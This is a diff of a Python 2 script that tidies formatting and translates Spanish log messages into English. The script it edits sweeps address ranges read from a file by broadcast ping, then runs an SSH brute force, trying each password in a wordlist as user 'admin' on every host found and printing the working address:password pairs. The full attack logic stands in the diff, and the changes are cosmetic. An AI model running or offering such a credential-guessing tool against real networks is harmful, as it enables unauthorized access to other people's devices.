@@ -8,22 +8,23 @@ import re
 import collections
 import paramiko
 
-def GetNetwAddress():
+
+def getnetwaddress():
 
     """
-        Open the file to get the IP range supossing format A.B.C.D /8,12,etc
+        Open the file to get the IP range assuming format A.B.C.D /8,12,etc
     """
     try:
         addresses = list()
-        with open('iprange.txt','r') as fil:
+        with open('iprange.txt', 'r') as fil:
             for ip_add in fil:
-                ip_add=re.search(r'[^\r ^\n]*',unicode(ip_add, "utf-8"))
-                ip_add=ipaddress.ip_network(ip_add.group())
+                ip_add = re.search(r'[^\r ^\n]*', unicode(ip_add, "utf-8"))
+                ip_add = ipaddress.ip_network(ip_add.group())
                 broadcast_address = ip_add.broadcast_address
-                proc = subprocess.Popen("ping -c 2 -b " + str(broadcast_address),stdout=subprocess.PIPE, shell = True)
-            	(out,err)=proc.communicate()
+                proc = subprocess.Popen("ping -c 2 -b " + str(broadcast_address), stdout=subprocess.PIPE, shell=True)
+            	(out,err)= proc.communicate()
                 for line in out.splitlines():
-                    matches=re.search(r'^\d+ bytes from (?P<IP>.*): icmp_req=\d ttl=\d+ time=.*$',line, re.MULTILINE)
+                    matches = re.search(r'^\d+ bytes from (?P<IP>.*): icmp_req=\d ttl=\d+ time=.*$', line, re.MULTILINE)
                     if matches:
                         addresses.append(matches.group('IP'))
 
@@ -33,28 +34,29 @@ def GetNetwAddress():
     except IOError:
         print "The file with the IP range doesn't exist"
     except ValueError:
-        print "The range is not valid"
+        print "IP range not valid"
+
 
 def scandpassword():
-    iplist = GetNetwAddress()
+    iplist = getnetwaddress()
     passwords = list()
     with open('password.txt', 'r') as passwo:
         for line in passwo:
-            passwords.append(line.replace("\r\n",""))
+            passwords.append(line.replace("\r\n", ""))
     passwordss = list()
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     for address in iplist:
         for pas in passwords:
             try:
-                print "Intentando conexión con " + address+ " password " + pas
+                print "Trying connection with device " + address + " password " + pas
                 ssh_client.connect(hostname=address,
-                                   username='admin', #El sabiondo de Spark dice que se tienen que todos los usernames son así
+                                   username='admin',
                                    password=pas)
                 passwordss.append([address, pas])
-                print "exito"
+                print "Success"
             except Exception as e:
-                print "fallida"
+                print "Fail"
                 continue
     for i in passwordss:
         print i[0]+":"+i[1]
